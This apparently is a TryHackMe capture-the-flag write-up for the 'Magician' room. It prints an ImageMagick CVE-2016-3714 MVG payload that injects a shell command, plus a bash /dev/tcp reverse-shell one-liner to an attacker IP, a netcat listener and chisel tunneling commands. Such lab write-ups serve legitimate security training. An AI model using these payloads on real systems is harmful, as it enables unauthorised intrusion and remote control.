---
layout: post
author: Razor
title: "Tryhackme Magician"
categories: [Tryhackme, Linux]
tags: [boot2root, easy-box, web exploitation, enumeration, cve]     # TAG names should always be lowercase
image: assets/thm_magician/bg.png
toc: true
---

## Introduction
This is partical room from tryhackme entitled "Magician" with Easy difficulty. In this room we will learn about Exploitation RCE with multiple vulnerabilities in ImageMagick from CVE-2016–3714 and Tunneling port. We will doing to getting shell from web then tunneling listening port to getting another web which contain root flag. Link room [here](https://tryhackme.com/room/magician)

## Scanning

### Nmap

```bash
$ nmap -sC -sV -oA nmap/nmap 10.10.74.239
Nmap scan report for 10.10.74.239
Host is up (0.37s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
8081/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: magician
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 23 17:27:16 2021 -- 1 IP address (1 host up) scanned in 37.43 seconds
```
We just have 2 port open like FTP and Webservice (nginx). now i want to try login ftp with anonymous login. 

![img](/assets/thm_magician/bg_1.png)

As you can see we can't let in but there is have some hint for us. I'm going to https://imagetragick.com which is POC of CVE-2016–3714. Now before going to web we must put host in /etc/hosts. 
```bat 
127.0.0.1       localhost
127.0.1.1       Razor

# CTF
10.10.74.239 magician

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

![img](/assets/thm_magician/bg_2.png)

I'm trying to using burpsuite and test POC from imagetragick which we found before.

![img](/assets/thm_magician/bg_3.png)

## Exploit

then i'm try to following POC from imagetragick and checking with ping back to my ip using tcpdump `$ sudo tcpdump -i tun0 host magician and -n icmp`.

```bat
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oos.jpg";ping -c5 10.2.47.251")'
pop graphic-context
```

![img](/assets/thm_magician/bg_4.png)

### Getting Shell

And its works. i got ping back from web, So we can create revershell with `bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1` then prepare for revershell with nc `nc -lvnp <PORT>` 

![img](/assets/thm_magician/bg_5.png)

Now i got shell, then let's make it shell to real shell .

![img](/assets/thm_magician/bg_6.png)

## Flag User.txt

As you can see we got user magician and let's take the flag :D

```bash
magician@magician:~$ cd /home/magician/
magician@magician:~$ cat user.txt 
THM{s----REDACTED----x}
magician@magician:~$ 
```

There is have some files namely `the_magic_continues` , let's take a look the file :

![img](/assets/thm_magician/bg_7.png)

There is give me some hint again then let's take a look port on This machines `(netstat -punta || ss --ntpu) | grep "127"`.

![img](/assets/thm_magician/bg_8.png)

There are many methods we can use to tunnel the port. In this case I will use chisel and you can download that in [here](https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz), Then uploaded to machine.

![img](/assets/thm_magician/bg_9.png)

Now we can setup the Chisel : 
- First create server reverse port to tunneling port `./chisel server --reverse --port 4242`.
![img](/assets/thm_magician/bg_10.png)
- Then create client on machines and setting R port to 6969 for access in web "localhost:6969" `./chisel client 10.2.47.251:4242 R:6969:localhost:6666`.
![img](/assets/thm_magician/bg_11.png)

Now we done for setup tunneling localhost:6666 to localhost:6969(In My Machine). Now let's take a look the browser 

![img](/assets/thm_magician/bg_12.png)

Then just type `/root/root.txt`

![img](/assets/thm_magician/bg_13.png)

## Flag Root.txt

There is a Binary and we can convert to ASCII   

![img](/assets/thm_magician/bg_14.png)

Then we have flag for root not :D

so that's all the writeup that I made, now we have user flag and root flag. 

Happy hacking :D 